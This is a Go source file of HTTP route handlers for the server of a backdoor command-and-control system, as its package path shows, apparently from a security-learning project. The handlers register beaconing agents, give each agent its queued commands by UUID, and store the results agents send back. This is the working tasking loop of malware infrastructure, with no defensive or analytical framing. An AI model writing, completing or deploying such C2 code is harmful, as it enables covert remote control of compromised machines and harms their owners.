package routers

import (
	"encoding/json"
	"fmt"
	"github.com/gin-gonic/gin"
	"go-sec/backdoor/command-control/server/models"
	"net/http"
	"strconv"
)

func Ping(c *gin.Context) {
	var agent models.Agent
	err := c.BindJSON(&agent)
	fmt.Println(agent, err)
	agentId := agent.AgentId
	has, err := models.ExitAgentId(agentId)
	if err != nil {
		c.Error(err)
	}
	if has {
		_ = models.UpdateAgent(agentId, agent)
	} else {
		err = agent.Insert()
		c.Error(err)
	}
}

func GetCommand(c *gin.Context) {
	agentId := c.Param("uuid")
	cmds, _ := models.ListCommandByAgentId(agentId)
	cmdsJson, _ := json.Marshal(cmds)
	fmt.Println(agentId, string(cmdsJson))

	c.JSON(http.StatusOK, cmds)
}

func SendResult(c *gin.Context) {
	cmdId := c.Param("id")
	result := c.PostForm("result")
	id, _ := strconv.Atoi(cmdId)
	err := models.UpdateCommandResult(int64(id), result)
	if err != nil {
		c.Error(err)
	}
	err = models.SetCmdStatusToFinished(int64(id))
	if err != nil {
		c.Error(err)
	}
}
